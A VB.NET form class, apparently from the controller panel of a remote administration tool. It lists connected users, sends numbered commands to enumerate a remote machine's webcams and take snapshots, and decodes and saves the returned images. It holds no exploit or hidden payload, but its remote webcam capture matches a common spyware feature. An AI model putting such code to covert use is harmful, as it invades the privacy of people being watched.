Public Class Webcamviewer

    Public Function HexToWebcamSnapshot(ByVal HexString As String) As Image
        Try
            If HexString = Nothing Then
                MsgBox("Invalid data recieved. Retry.", MsgBoxStyle.Exclamation)
                Return Nothing
            End If
            Dim Bytes(HexString.Length \ 2 - 1) As Byte
            For I = 0 To Bytes.Length - 1
                Bytes(I) = Convert.ToByte(HexString.Substring(I * 2, 2), 16)
            Next
            Return Image.FromStream(New IO.MemoryStream(Bytes))
        Catch ex As Exception
            MsgBox("Failed formatting data from stream. Please retry.", MsgBoxStyle.Exclamation)
            Return Nothing
        End Try
    End Function

    Public Sub SplitWebcamDevices(ByVal WebcamString As String)
        ComboBoxWebcamDevices.Items.Clear()
        Dim WebcamDevices() As String = Split(WebcamString, "|||")
        For i As Integer = 0 To WebcamDevices.Length - 1
            ComboBoxWebcamDevices.Items.Add(WebcamDevices(i))
        Next
        ComboBoxWebcamDevices.Items.Remove(String.Empty)
        ComboBoxWebcamDevices.SelectedIndex = 0
    End Sub

    Private Sub ButtonSaveSnapshot_Click(sender As Object, e As EventArgs) Handles ButtonSaveSnapshot.Click
        If PictureBoxWebcam.Image Is Nothing Then
            MsgBox("Please take a webcam snapshot first.", MsgBoxStyle.Exclamation, "Webcamviewer")
            Exit Sub
        Else
            If SaveFileDialogWebcam.ShowDialog = Windows.Forms.DialogResult.OK Then
                PictureBoxWebcam.Image.Save(SaveFileDialogWebcam.FileName, System.Drawing.Imaging.ImageFormat.Jpeg)
                MsgBox("Screenshot saved with success.", MsgBoxStyle.Information, "Webcamviewer")
            End If
        End If
    End Sub

    Private Sub ButtonTakeSnapshot_Click(sender As Object, e As EventArgs) Handles ButtonTakeSnapshot.Click

        Settings.AddLog("Pending", Settings.State.Pending, "Taking webcam snapshot...")
        Main.ShowNoGroupsToolStripMenuItem.PerformClick()
        If ComboBoxWebcamDevices.Items.Count = 0 Then
            MsgBox("No webcam device selected.", MsgBoxStyle.Exclamation, "Webcamviewer")
            Exit Sub
        Else
            Dim SelectedDevice As Integer = ComboBoxWebcamDevices.SelectedIndex
            If Main.ListViewMain.Items.Count > 0 Then
                If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                    Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
            Else
                MsgBox("No Users online.", MsgBoxStyle.Exclamation)
            End If
            Try
                Main.WriteData(CType(SelectedDevice, String)) 'here
                Main.WriteCommand(Main.SelectedUserID & "|34")
                Waiting.ShowDialog()
            Catch x As Exception
                MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Webcamviewer")
            End Try
        End If
    End Sub

    Public Sub ButtonLoadDevices_Click(sender As Object, e As EventArgs) Handles ButtonLoadDevices.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Requesting webcam devices...")
        ComboBoxWebcamDevices.Items.Clear()
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteCommand(Main.SelectedUserID & "|33")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Webcamviewer")
        End Try
    End Sub

    Private Sub ComboBoxWebcamDevices_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBoxWebcamDevices.SelectedIndexChanged

    End Sub

    Private Sub Webcamviewer_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        PictureBoxWebcam.Image = Nothing
        ComboBoxWebcamDevices.Items.Clear()
    End Sub
End Class